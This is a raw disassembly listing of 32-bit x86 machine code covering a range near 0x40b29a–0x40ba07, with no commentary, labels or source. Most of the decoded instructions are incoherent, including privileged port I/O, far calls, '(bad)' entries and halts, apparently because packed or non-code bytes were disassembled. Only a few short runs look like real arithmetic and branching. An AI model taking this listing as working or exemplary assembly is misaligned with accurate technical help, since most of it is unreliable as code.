  40b29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b29b:	inc    ecx
  40b29c:	icebp  
  40b29d:	imul   ebx,ebp,0xbcaf76c
  40b2a3:	lods   eax,DWORD PTR ds:[esi]
  40b2a4:	es pop ds
  40b2a6:	enter  0x73e0,0x2
  40b2aa:	xor    al,0x95
  40b2ac:	adc    BYTE PTR [eax+eax*2-0x38],bh
  40b2b0:	lock inc esp
  40b2b2:	call   0x837d:0x30457e5d
  40b2b9:	sbb    al,0xc5
  40b2bb:	mov    cl,BYTE PTR [ecx]
  40b2bd:	or     eax,0xa74d3fc8
  40b2c2:	jo     0x40b2a1
  40b2c4:	test   DWORD PTR [edi*1+0x61a19408],ebp
  40b2cb:	cmp    eax,0xf581d1db
  40b2d0:	dec    esp
  40b2d1:	pop    ebp
  40b2d2:	in     al,0xd8
  40b2d4:	or     DWORD PTR ds:0xb241c8b,ebx
  40b2da:	sub    eax,0x168c8f91
  40b2df:	in     eax,dx
  40b2e0:	or     ebx,DWORD PTR [eax+0x58]
  40b2e3:	out    dx,al
  40b2e4:	mov    ebx,0xf0dca39c
  40b2e9:	and    al,0x98
  40b2eb:	fwait
  40b2ec:	dec    esp
  40b2ed:	out    0xc7,eax
  40b2ef:	jmp    0x40b32d
  40b2f1:	retf   0x64c0
  40b2f4:	jg     0x40b305
  40b2f6:	rcl    DWORD PTR [edx],1
  40b2f8:	and    eax,DWORD PTR [ecx]
  40b2fa:	(bad)  
  40b2fc:	mov    ecx,0x19fd95ea
  40b301:	or     bl,BYTE PTR [esi+esi*1-0x4600ef0e]
  40b308:	stc    
  40b309:	pmaxsw mm0,QWORD PTR [edx]
  40b30c:	retf   0x75a6
  40b30f:	jmp    0x4dda6cd3
  40b314:	or     BYTE PTR [ecx],0x74
  40b317:	out    dx,al
  40b318:	mov    ah,0xba
  40b31a:	fmul   QWORD PTR [edi-0xb]
  40b31d:	inc    esi
  40b31e:	mov    dh,0xdd
  40b320:	cmc    
  40b321:	arpl   WORD PTR [ecx+0x20c02a26],si
  40b327:	xchg   edx,eax
  40b328:	adc    al,bl
  40b32a:	enter  0xb94e,0x33
  40b32e:	or     esp,esp
  40b330:	lahf   
  40b331:	add    DWORD PTR [eax+0x2c],edi
  40b334:	pop    ecx
  40b335:	out    0x61,eax
  40b337:	in     eax,0x53
  40b339:	lods   al,BYTE PTR ds:[esi]
  40b33a:	bound  edx,QWORD PTR [edi-0x7a]
  40b33d:	xchg   edi,eax
  40b33e:	add    ah,BYTE PTR [edi]
  40b340:	mov    edx,ebx
  40b342:	popa   
  40b343:	cld    
  40b344:	or     al,0xbe
  40b346:	or     bh,bh
  40b348:	sbb    cl,BYTE PTR [esi+0x1c1f076b]
  40b34e:	fcomp  DWORD PTR [esp+ebp*8-0x31d92f00]
  40b355:	pop    edi
  40b356:	cdq    
  40b357:	cs cmp al,0x24
  40b35a:	arpl   WORD PTR [edi],di
  40b35c:	aam    0x65
  40b35e:	lods   eax,DWORD PTR ds:[esi]
  40b35f:	sub    al,bh
  40b361:	pop    edi
  40b362:	lea    ebx,[edx-0x60]
  40b365:	mov    ebx,0xe39d66e5
  40b36a:	jecxz  0x40b343
  40b36c:	sti    
  40b36d:	fidivr WORD PTR [edi+0x38fc5b84]
  40b373:	xor    eax,0x954c231
  40b378:	rol    DWORD PTR [ecx-0xb9f8e4c],cl
  40b37e:	fs jl  0x40b383
  40b381:	mov    cl,0xad
  40b383:	nop
  40b384:	jne    0x40b3e8
  40b386:	add    al,0xe2
  40b388:	xor    eax,0xceda29ef
  40b38d:	lea    ecx,[ebp+0x3fcbd991]
  40b393:	aaa    
  40b394:	cmp    eax,0x99537de5
  40b399:	shl    DWORD PTR [edi],1
  40b39b:	out    dx,eax
  40b39c:	inc    eax
  40b39d:	mov    ds:0x3044c9e1,eax
  40b3a2:	iret   
  40b3a3:	dec    ecx
  40b3a4:	or     eax,0x9b8219ab
  40b3a9:	and    DWORD PTR [edx],edx
  40b3ab:	lock jle 0x40b3a2
  40b3ae:	sbb    ecx,DWORD PTR [ebp-0x658c314f]
  40b3b4:	cmp    eax,edi
  40b3b6:	call   0x4d43:0xd3e5d3f4
  40b3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3be:	xchg   ebp,eax
  40b3bf:	gs cli 
  40b3c1:	mov    ecx,0x9b6a168e
  40b3c6:	xor    BYTE PTR [edx-0x5813b03b],al
  40b3cc:	inc    esi
  40b3cd:	cmp    BYTE PTR [ecx],al
  40b3cf:	mul    DWORD PTR [ebx-0x72799a38]
  40b3d5:	gs cmp eax,0xf4b092e8
  40b3db:	xor    DWORD PTR [eax+0x4],esi
  40b3de:	dec    ebp
  40b3df:	dec    ecx
  40b3e0:	int    0x69
  40b3e2:	jb     0x40b3fc
  40b3e4:	push   esi
  40b3e5:	retf   0xcd6b
  40b3e8:	add    eax,0xaf3f7511
  40b3ed:	lods   al,BYTE PTR ds:[esi]
  40b3ee:	jo     0x40b3b6
  40b3f0:	cwde   
  40b3f1:	inc    ebx
  40b3f2:	mov    dl,0x9a
  40b3f4:	pop    esi
  40b3f5:	repz inc dh
  40b3f8:	std    
  40b3f9:	shr    BYTE PTR [edx-0x3d],cl
  40b3fc:	call   0x6faa:0x14eb0894
  40b403:	xchg   DWORD PTR [ebx+edi*4-0x4],ebp
  40b407:	lahf   
  40b408:	repz dec esp
  40b40a:	pop    ss
  40b40b:	lods   eax,DWORD PTR ds:[esi]
  40b40c:	stos   DWORD PTR es:[edi],eax
  40b40d:	sub    eax,0xb287835a
  40b412:	or     DWORD PTR [esi+0x286a2310],0x538d827c
  40b41c:	pop    DWORD PTR [edi+0x1d]
  40b41f:	adc    ecx,DWORD PTR [esi+0x48225da7]
  40b425:	jg     0x40b46c
  40b427:	push   ebp
  40b428:	hlt    
  40b429:	call   DWORD PTR [ebx]
  40b42b:	xor    BYTE PTR [edi+0x15dbd8e3],bh
  40b431:	dec    eax
  40b432:	lods   al,BYTE PTR ds:[esi]
  40b433:	sub    al,0xae
  40b435:	mov    al,ds:0x8c881c46
  40b43a:	push   ds
  40b43b:	sbb    al,0xbd
  40b43d:	outs   dx,DWORD PTR ds:[esi]
  40b43e:	(bad)  
  40b43f:	or     ebx,eax
  40b441:	test   DWORD PTR ds:0x100d2f86,ebp
  40b447:	inc    edx
  40b448:	fucomp st(3)
  40b44a:	pop    es
  40b44b:	addr16 jne 0x40b421
  40b44e:	js     0x40b4ae
  40b450:	mov    gs,WORD PTR [edi+0x1]
  40b453:	(bad)  
  40b454:	ja     0x40b46b
  40b456:	nop
  40b457:	sbb    al,0x5f
  40b459:	jne    0x40b486
  40b45b:	pop    ss
  40b45c:	gs jmp 0x40b3e0
  40b45f:	scas   al,BYTE PTR es:[edi]
  40b460:	sbb    DWORD PTR [esi+0x8],ebp
  40b463:	push   ds
  40b464:	(bad)  
  40b465:	pushf  
  40b466:	and    eax,0xe560d5de
  40b46b:	push   eax
  40b46c:	sbb    al,0x16
  40b46e:	ficomp WORD PTR [ebx+eiz*4+0x2e]
  40b472:	rep ins DWORD PTR es:[edi],dx
  40b474:	gs clc 
  40b476:	test   al,0x96
  40b478:	cs pop ebx
  40b47a:	cmp    ah,0xd0
  40b47d:	xchg   esi,eax
  40b47e:	push   ebp
  40b47f:	(bad)  
  40b480:	loope  0x40b438
  40b482:	stc    
  40b483:	adc    esi,ebp
  40b485:	test   BYTE PTR [edx],ch
  40b487:	adc    ebx,eax
  40b489:	and    esi,DWORD PTR [esi+0x3792c887]
  40b48f:	or     ah,ch
  40b491:	nop
  40b492:	xor    eax,0x6da591c9
  40b497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b498:	cmp    BYTE PTR [ecx],dh
  40b49a:	xchg   BYTE PTR [ebp-0x3e],ah
  40b49d:	dec    ebx
  40b49e:	jno    0x40b50f
  40b4a0:	or     DWORD PTR [ebp+0x1d],ecx
  40b4a3:	and    ecx,DWORD PTR [edx-0x25bfcc3e]
  40b4a9:	jg     0x40b4eb
  40b4ab:	inc    esp
  40b4ac:	push   ebp
  40b4ad:	and    dh,BYTE PTR [eax+0x66db01a7]
  40b4b3:	sbb    ah,BYTE PTR [edx-0x2e]
  40b4b6:	xchg   esp,eax
  40b4b7:	adc    dl,ch
  40b4b9:	pop    edx
  40b4ba:	mov    al,ds:0x1f1ea203
  40b4bf:	xor    ebp,DWORD PTR [edx+ecx*4-0x56]
  40b4c3:	inc    esi
  40b4c4:	mov    cl,0x69
  40b4c6:	iret   
  40b4c7:	sub    eax,0x4771e32a
  40b4cc:	adc    BYTE PTR [ebx-0x23],ah
  40b4cf:	inc    edi
  40b4d0:	pop    ebp
  40b4d1:	lds    eax,FWORD PTR [ecx-0x6d]
  40b4d4:	or     ebx,DWORD PTR [ebx]
  40b4d6:	sub    edx,DWORD PTR [esi]
  40b4d8:	mov    ah,0x89
  40b4da:	scas   al,BYTE PTR es:[edi]
  40b4db:	cmp    eax,ecx
  40b4dd:	dec    ebx
  40b4de:	mov    cl,0xea
  40b4e0:	pop    ecx
  40b4e1:	out    0xc0,al
  40b4e3:	pop    ebx
  40b4e4:	jp     0x40b4a2
  40b4e6:	fistp  DWORD PTR [edi+ecx*1-0x30]
  40b4ea:	rcr    DWORD PTR [ebx+ecx*1+0xf6e2b2e],0x7b
  40b4f2:	std    
  40b4f3:	mov    ebp,0x23cb6238
  40b4f8:	add    ch,al
  40b4fa:	push   edx
  40b4fb:	cmp    BYTE PTR [eax],0xbe
  40b4fe:	pop    es
  40b4ff:	jecxz  0x40b4b3
  40b501:	ss jns 0x40b4e4
  40b504:	mov    WORD PTR [esi],gs
  40b506:	jbe    0x40b4b5
  40b508:	retf   0xd5f
  40b50b:	xchg   BYTE PTR [eax+ebx*1-0x3b186b43],ah
  40b512:	leave  
  40b513:	addr16 cmp eax,0x7bd4d0cf
  40b519:	adc    eax,0x7f2afe7e
  40b51e:	popa   
  40b51f:	mov    ebx,0x8bd7af0f
  40b524:	jge    0x40b51e
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	and    eax,edi
  40b551:	pushf  
  40b552:	sub    al,0xc1
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b5a7
  40b55c:	and    DWORD PTR [ecx-0x21],0xe92d6461
  40b563:	repnz mov al,0x2a
  40b566:	and    BYTE PTR [edi+0x66],0xd0
  40b56a:	shl    BYTE PTR [edx+0x69b7cee0],1
  40b570:	test   BYTE PTR [eax],bh
  40b572:	add    BYTE PTR [ecx+eiz*4],bl
  40b575:	cs jmp 0x40b59f
  40b578:	out    0x83,al
  40b57a:	pop    es
  40b57b:	hlt    
  40b57c:	mov    al,BYTE PTR [esi-0x7e0e7c97]
  40b582:	mov    ecx,0x2164ff69
  40b587:	or     BYTE PTR [eax],ah
  40b589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b58a:	lods   al,BYTE PTR ds:[esi]
  40b58b:	test   DWORD PTR ds:0x7e3da6d5,eax
  40b591:	inc    edx
  40b592:	repz add eax,0xc782fcf8
  40b598:	or     BYTE PTR [eax-0x430398da],bh
  40b59e:	rcr    BYTE PTR [ecx+ecx*1],1
  40b5a1:	xchg   ebx,eax
  40b5a2:	(bad)  
  40b5a3:	fadd   DWORD PTR [ebx+ebp*1+0x5b]
  40b5a7:	scas   eax,DWORD PTR es:[edi]
  40b5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a9:	lock out 0xd7,eax
  40b5ac:	or     cl,bh
  40b5ae:	sbb    edi,DWORD PTR [ecx+0x32d994a1]
  40b5b4:	mov    ah,ah
  40b5b6:	mov    ecx,0xdcdefdab
  40b5bb:	loopne 0x40b5f0
  40b5bd:	add    dh,bl
  40b5bf:	and    BYTE PTR ds:0x88fcd8dd,cl
  40b5c5:	fxch   st(0)
  40b5c7:	(bad)  
  40b5c8:	arpl   WORD PTR [esi],sp
  40b5ca:	out    dx,eax
  40b5cb:	jns    0x40b55f
  40b5cd:	cdq    
  40b5ce:	jb     0x40b5d4
  40b5d0:	mov    eax,ds:0x8591af6f
  40b5d5:	add    DWORD PTR [ecx],edi
  40b5d7:	mov    cl,0x22
  40b5d9:	enter  0x70e3,0x31
  40b5dd:	jecxz  0x40b63d
  40b5df:	or     al,0xe2
  40b5e1:	ja     0x40b5ce
  40b5e3:	test   dh,0x57
  40b5e6:	sbb    al,0x69
  40b5e8:	pusha  
  40b5e9:	cmp    dl,bl
  40b5eb:	adc    dh,bl
  40b5ed:	je     0x40b5a2
  40b5ef:	jmp    DWORD PTR [ebx]
  40b5f1:	xchg   edi,eax
  40b5f2:	xlat   BYTE PTR ds:[ebx]
  40b5f3:	leave  
  40b5f4:	inc    ebp
  40b5f5:	cmp    cl,dh
  40b5f7:	popa   
  40b5f8:	add    edx,DWORD PTR [eax]
  40b5fa:	lods   al,BYTE PTR ds:[esi]
  40b5fb:	add    esp,ebp
  40b5fd:	jo     0x40b5a6
  40b5ff:	into   
  40b600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b601:	mov    edi,0xd456ad5e
  40b606:	inc    DWORD PTR [ebp-0x1f]
  40b609:	inc    esi
  40b60a:	adc    BYTE PTR [esi],0x6b
  40b60d:	inc    eax
  40b60e:	dec    edi
  40b60f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b610:	pop    ebx
  40b611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b612:	mov    ds:0xad60c59,eax
  40b617:	pop    esp
  40b618:	xchg   esp,eax
  40b619:	push   ds
  40b61a:	add    BYTE PTR [eax-0x2c],cl
  40b61d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b61e:	xchg   edi,eax
  40b61f:	mov    edx,0x116d6665
  40b624:	shr    BYTE PTR [eax+0x1de9b776],cl
  40b62a:	lds    ecx,FWORD PTR [edi]
  40b62c:	shr    ah,cl
  40b62e:	jbe    0x40b649
  40b630:	nop
  40b631:	pop    esp
  40b632:	dec    eax
  40b633:	mov    al,0xd8
  40b635:	ficomp WORD PTR [esi+ebx*8-0xe]
  40b639:	pop    ebp
  40b63a:	xchg   edi,eax
  40b63b:	mov    dh,BYTE PTR [edi+0x4b]
  40b63e:	adc    eax,DWORD PTR [edi+0x73a6fd5e]
  40b644:	xchg   ecx,eax
  40b645:	cmp    DWORD PTR [esi+0x23e57af4],ecx
  40b64b:	jecxz  0x40b5d7
  40b64d:	push   eax
  40b64e:	mul    BYTE PTR [ebp+0x6603bd90]
  40b654:	dec    esi
  40b655:	jge    0x40b6d1
  40b657:	gs jb  0x40b69f
  40b65a:	bound  edi,QWORD PTR [eax+edx*8-0x4bd04cc5]
  40b661:	and    ch,BYTE PTR [edx+0x565a3af8]
  40b667:	icebp  
  40b668:	xor    eax,0xdf70c600
  40b66d:	sbb    eax,0x132ca9fe
  40b672:	push   ss
  40b673:	push   ds
  40b674:	push   0x509f765a
  40b679:	and    eax,0x485f8ead
  40b67e:	loopne 0x40b627
  40b680:	jns    0x40b65e
  40b682:	cmp    DWORD PTR [edi-0x54],ebx
  40b685:	iret   
  40b686:	dec    edx
  40b687:	mov    edx,0x9bb169ed
  40b68c:	pop    ds
  40b68d:	pop    ecx
  40b68e:	ds jnp 0x40b688
  40b691:	sub    BYTE PTR [edi+0x230a0e5c],ah
  40b697:	push   0x333a4532
  40b69c:	mov    ecx,0xc8b50e47
  40b6a1:	hlt    
  40b6a2:	fcom   QWORD PTR [ecx-0x14]
  40b6a5:	fs repnz fwait
  40b6a8:	mov    ecx,cs
  40b6aa:	in     al,dx
  40b6ab:	rcl    dh,0xbf
  40b6ae:	push   cs
  40b6af:	pop    es
  40b6b0:	dec    eax
  40b6b1:	xlat   BYTE PTR ds:[ebx]
  40b6b2:	mov    dh,0xf4
  40b6b4:	data16 mov dl,0xcc
  40b6b7:	stos   BYTE PTR es:[edi],al
  40b6b8:	sub    eax,0xc83cd6e2
  40b6bd:	mov    ebp,0x2ea530e4
  40b6c2:	idiv   BYTE PTR [eax]
  40b6c4:	test   al,0x9d
  40b6c6:	inc    eax
  40b6c7:	inc    edi
  40b6c8:	aad    0x9b
  40b6ca:	push   ds
  40b6cb:	outs   dx,DWORD PTR ds:[esi]
  40b6cc:	fstp   TBYTE PTR [eax+0x3b]
  40b6cf:	shl    esi,1
  40b6d1:	fild   DWORD PTR [edi+ebp*1-0x1eabb2b7]
  40b6d8:	jnp    0x40b689
  40b6da:	jbe    0x40b722
  40b6dc:	outs   dx,DWORD PTR ds:[esi]
  40b6dd:	jmp    0xd2dd:0x7b6b683e
  40b6e4:	xchg   ebx,eax
  40b6e5:	mov    dh,BYTE PTR [ecx-0x6b]
  40b6e8:	es pusha 
  40b6ea:	outs   dx,DWORD PTR ds:[esi]
  40b6eb:	daa    
  40b6ec:	add    al,0x2b
  40b6ee:	ret    
  40b6ef:	call   0xc73fe0c8
  40b6f4:	push   ebp
  40b6f5:	mov    al,0xd
  40b6f7:	push   es
  40b6f8:	inc    ebx
  40b6f9:	mov    bl,0x6f
  40b6fb:	(bad)
  40b6ff:	sub    bl,BYTE PTR [ebx]
  40b701:	fwait
  40b702:	xor    eax,0x78b5b2a8
  40b707:	rcr    esp,1
  40b709:	les    ebp,FWORD PTR [eax]
  40b70b:	sub    dh,BYTE PTR [edx]
  40b70d:	sub    al,0x66
  40b70f:	push   esi
  40b710:	push   edx
  40b711:	dec    esp
  40b712:	dec    ebx
  40b713:	mov    bh,0xf8
  40b715:	fmul   st,st(6)
  40b717:	pop    ebp
  40b718:	addr16 add al,0xf1
  40b71b:	push   esp
  40b71c:	xor    bh,dl
  40b71e:	mov    al,0x6
  40b720:	loope  0x40b712
  40b722:	in     eax,dx
  40b723:	cmp    DWORD PTR [esi-0x2df2ad56],edi
  40b729:	shr    BYTE PTR [ecx+eax*4-0x30],0xa9
  40b72e:	sbb    DWORD PTR [edi-0x2beae368],ebp
  40b734:	inc    eax
  40b735:	rcr    DWORD PTR [eax+0x15596eea],0xa2
  40b73c:	gs adc ebp,edx
  40b73f:	ins    BYTE PTR es:[edi],dx
  40b740:	data16 add BYTE PTR [edx],cl
  40b743:	and    edi,DWORD PTR [edi+eax*1-0x24]
  40b747:	xchg   esi,eax
  40b748:	pop    ebp
  40b749:	sbb    eax,0xe88463df
  40b74e:	mov    eax,0x9fd9584c
  40b753:	xchg   esp,eax
  40b754:	stc    
  40b755:	inc    esi
  40b756:	add    ecx,esi
  40b758:	in     eax,dx
  40b759:	(bad)  
  40b75a:	cwde   
  40b75b:	outs   dx,DWORD PTR ds:[esi]
  40b75c:	cvtps2pi mm7,QWORD PTR [esi+0x5b52f3f7]
  40b763:	mov    esi,0x280a9bc3
  40b768:	ja     0x40b79e
  40b76a:	retf   0xf26a
  40b76d:	imul   ecx
  40b76f:	cmc    
  40b770:	leave  
  40b771:	sub    eax,DWORD PTR [ecx]
  40b773:	inc    ebp
  40b774:	jp     0x40b728
  40b776:	ret    
  40b777:	xchg   ecx,eax
  40b778:	lahf   
  40b779:	pop    ebp
  40b77a:	or     DWORD PTR [edi-0x3749abc4],ebp
  40b780:	and    BYTE PTR [ecx+edi*1+0x43],bl
  40b784:	cmp    BYTE PTR [ebx],cl
  40b786:	retf   
  40b787:	imul   BYTE PTR [eax+0x7c]
  40b78a:	mov    ds:0x675a67a8,eax
  40b78f:	cmp    eax,0x27451d28
  40b794:	adc    eax,0x96e638e6
  40b799:	mov    ebp,0x74cc59cb
  40b79e:	pusha  
  40b79f:	test   DWORD PTR [edi+esi*1],edi
  40b7a2:	iret   
  40b7a3:	mov    ah,0xa2
  40b7a5:	in     eax,dx
  40b7a6:	xchg   ecx,eax
  40b7a7:	add    dl,BYTE PTR [esi+0x73]
  40b7aa:	sub    DWORD PTR [ebx+0x2],0xffffffec
  40b7ae:	push   es
  40b7af:	and    dl,ah
  40b7b1:	cmp    DWORD PTR [eax-0x4300fb6e],eax
  40b7b7:	xor    esp,ebp
  40b7b9:	push   esi
  40b7ba:	les    ebx,FWORD PTR [edx-0x3854820b]
  40b7c0:	xor    BYTE PTR [esp+eiz*8-0x5d19c1a4],dh
  40b7c7:	rol    DWORD PTR [ebx],0x6f
  40b7ca:	xchg   ecx,eax
  40b7cb:	outs   dx,DWORD PTR ds:[esi]
  40b7cc:	mov    ah,0x2f
  40b7ce:	enter  0xca58,0xc9
  40b7d2:	test   BYTE PTR [edx],dl
  40b7d4:	repz mov ds:0xda95ff52,eax
  40b7da:	outs   dx,BYTE PTR ds:[esi]
  40b7db:	or     DWORD PTR [ebx+0x4a0f1f86],edi
  40b7e1:	jecxz  0x40b775
  40b7e3:	cmp    eax,0xa5b17f67
  40b7e8:	adc    BYTE PTR [eax-0x18170869],0x4d
  40b7ef:	jno    0x40b7fc
  40b7f1:	mov    dh,0xca
  40b7f3:	popa   
  40b7f4:	stc    
  40b7f5:	jmp    0x8426850c
  40b7fa:	test   ch,bh
  40b7fc:	pusha  
  40b7fd:	dec    ecx
  40b7fe:	sti    
  40b7ff:	xchg   DWORD PTR [ecx-0x5b],edx
  40b802:	sub    ah,ah
  40b804:	fcom   QWORD PTR [edi+0xcf00369]
  40b80a:	mov    ds:0x88a8b62f,al
  40b80f:	or     eax,0x694a3fa2
  40b814:	in     eax,0x58
  40b816:	cdq    
  40b817:	ss xor al,0x5e
  40b81a:	scas   al,BYTE PTR es:[edi]
  40b81b:	push   ebp
  40b81c:	cdq    
  40b81d:	lds    eax,FWORD PTR [edi+0x56]
  40b820:	pop    esi
  40b821:	loope  0x40b7e5
  40b823:	adc    eax,0xceb9345a
  40b828:	pop    ecx
  40b829:	pop    ebx
  40b82a:	je     0x40b897
  40b82c:	adc    BYTE PTR [ecx-0x32],ah
  40b82f:	loope  0x40b89d
  40b831:	mov    bl,0x96
  40b833:	iret   
  40b834:	fadd   QWORD PTR [ebx+0x1e4bc1bb]
  40b83a:	pop    ecx
  40b83b:	dec    edi
  40b83c:	test   al,0x39
  40b83e:	add    DWORD PTR [esp+edx*2+0x2],edx
  40b842:	cmp    al,0x58
  40b844:	sahf   
  40b845:	cdq    
  40b846:	aaa    
  40b847:	sahf   
  40b848:	les    ebx,FWORD PTR [edi-0xd]
  40b84b:	fisttp QWORD PTR [ecx-0x20]
  40b84e:	mov    cl,0x5
  40b850:	xchg   BYTE PTR [esi+ebp*1+0x589a288a],ch
  40b857:	and    cl,ah
  40b859:	fld    TBYTE PTR [edi]
  40b85b:	mov    esi,0xeb50701a
  40b860:	mov    ebp,0x848754da
  40b865:	xchg   ecx,eax
  40b866:	pop    edx
  40b867:	mov    bh,BYTE PTR [ebp+0x62]
  40b86a:	sub    ebx,esp
  40b86c:	loop   0x40b81e
  40b86e:	or     DWORD PTR [edx+0x29],0xffffffdc
  40b872:	jns    0x40b866
  40b874:	inc    edx
  40b875:	lods   eax,DWORD PTR ds:[esi]
  40b876:	jo     0x40b8e8
  40b878:	sbb    DWORD PTR [eax-0x51],esp
  40b87b:	clc    
  40b87c:	imul   edx,DWORD PTR [ecx+eiz*4+0x38a5e44],0xb3325dc
  40b887:	sbb    cl,al
  40b889:	mov    edx,0x6e39c533
  40b88e:	pop    edi
  40b88f:	dec    edx
  40b890:	mov    edi,0x11d7d73a
  40b895:	pop    edx
  40b896:	leave  
  40b897:	icebp  
  40b898:	clc    
  40b899:	adc    edx,ebx
  40b89b:	addr16 aam 0xb1
  40b89e:	(bad)  
  40b89f:	sbb    BYTE PTR [eax-0x1e2a4eeb],ah
  40b8a5:	shl    DWORD PTR [ebp+0x1eb04d1c],1
  40b8ab:	arpl   WORD PTR es:0xa5abec1a,bx
  40b8b2:	(bad)  
  40b8b3:	retf   0xf8d6
  40b8b6:	xor    DWORD PTR [eax-0x72],esp
  40b8b9:	xchg   esi,eax
  40b8ba:	repnz push ds
  40b8bc:	out    dx,al
  40b8bd:	cwde   
  40b8be:	(bad)  
  40b8c0:	dec    ebx
  40b8c1:	cmp    DWORD PTR [eax-0x42],0xfffffff4
  40b8c5:	pop    DWORD PTR [ebp+0x74]
  40b8c8:	stc    
  40b8c9:	out    0x84,al
  40b8cb:	ret    0x2456
  40b8ce:	pop    es
  40b8cf:	arpl   WORD PTR [edi-0x8],bp
  40b8d2:	cmp    al,0xfd
  40b8d4:	adc    BYTE PTR [esi],0xed
  40b8d7:	xchg   ecx,eax
  40b8d8:	les    esi,FWORD PTR [ebx-0x3f]
  40b8db:	aad    0x34
  40b8dd:	cmp    BYTE PTR [edx],0x55
  40b8e0:	add    DWORD PTR ds:0x2c82b3be,eax
  40b8e6:	rep ins DWORD PTR es:[edi],dx
  40b8e8:	jae    0x40b962
  40b8ea:	jle    0x40b8b9
  40b8ec:	ret    
  40b8ed:	mov    al,0xbd
  40b8ef:	push   ebx
  40b8f0:	jns    0x40b8de
  40b8f2:	fisttp DWORD PTR [esi]
  40b8f4:	fsubr  st,st(0)
  40b8f6:	ds or  al,0x4f
  40b8f9:	in     al,0x77
  40b8fb:	lods   al,BYTE PTR ds:[esi]
  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x1fd666fb],cl
  40b949:	add    eax,0x70836090
  40b94e:	jo     0x40b8ef
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b8e5
  40b954:	mov    al,0x60
  40b956:	or     bh,ah
  40b958:	cld    
  40b959:	scas   al,BYTE PTR es:[edi]
  40b95a:	jns    0x40b9b8
  40b95c:	pop    eax
  40b95d:	push   0x3f
  40b95f:	ret    0xab5c
  40b962:	mov    al,0x69
  40b964:	icebp  
  40b965:	imul   esi,eax,0x2f
  40b968:	test   dh,ch
  40b96a:	stos   DWORD PTR es:[edi],eax
  40b96b:	mov    ds:0x3376a1b7,eax
  40b970:	std    
  40b971:	fwait
  40b972:	add    ah,BYTE PTR [esi+esi*1]
  40b975:	popf   
  40b976:	adc    edi,DWORD PTR [ecx]
  40b978:	inc    eax
  40b979:	xchg   edx,eax
  40b97a:	in     al,0x43
  40b97c:	jle    0x40b984
  40b97e:	jne    0x40b9b1
  40b980:	xchg   DWORD PTR [ebp-0x78],eax
  40b983:	jno    0x40b915
  40b985:	mov    bl,0x99
  40b987:	mov    ds:0x14f11206,al
  40b98c:	fst    QWORD PTR [ebp+ecx*8+0x1b]
  40b990:	cmc    
  40b991:	retf   0xddb8
  40b994:	je     0x40b964
  40b996:	repz (bad) 
  40b998:	mov    edi,0x85bf6c33
  40b99d:	xor    cl,BYTE PTR [eax+ecx*4+0x50966d20]
  40b9a4:	retf   0x2775
  40b9a7:	das    
  40b9a8:	or     eax,0x443afc51
  40b9ad:	nop
  40b9ae:	in     al,dx
  40b9af:	dec    ebx
  40b9b0:	cdq    
  40b9b1:	dec    esi
  40b9b2:	dec    ecx
  40b9b3:	mov    esp,0x89b354f8
  40b9b8:	lods   al,BYTE PTR ds:[esi]
  40b9b9:	outs   dx,BYTE PTR ds:[esi]
  40b9ba:	cmp    DWORD PTR [ecx+edi*2+0x5c],eax
  40b9be:	in     al,0x25
  40b9c0:	pusha  
  40b9c1:	cs mov ebp,0x5a70fd78
  40b9c7:	adc    eax,0xcbe2475a
  40b9cc:	push   0xb50fb33
  40b9d1:	outs   dx,DWORD PTR ds:[esi]
  40b9d2:	lahf   
  40b9d3:	ins    DWORD PTR es:[edi],dx
  40b9d4:	ja     0x40b9fc
  40b9d6:	cld    
  40b9d7:	arpl   dx,ax
  40b9d9:	dec    eax
  40b9da:	sub    eax,0x58f5198c
  40b9df:	icebp  
  40b9e0:	shr    esp,cl
  40b9e2:	stos   BYTE PTR es:[edi],al
  40b9e3:	rcr    DWORD PTR [edi+eax*8-0x61ecccf3],1
  40b9ea:	fidivr DWORD PTR [ebp+0x1308a814]
  40b9f0:	or     bh,BYTE PTR [eax]
  40b9f2:	jmp    0xca5076ae
  40b9f7:	scas   eax,DWORD PTR es:[edi]
  40b9f8:	ror    DWORD PTR [edi-0x2a],cl
  40b9fb:	xor    BYTE PTR [ecx],cl
  40b9fd:	mov    eax,ds:0xa9b4d6cc
  40ba02:	in     al,dx
  40ba03:	out    0x2e,al
  40ba05:	jo     0x40ba13
  40ba07:	mov    ch,0x86
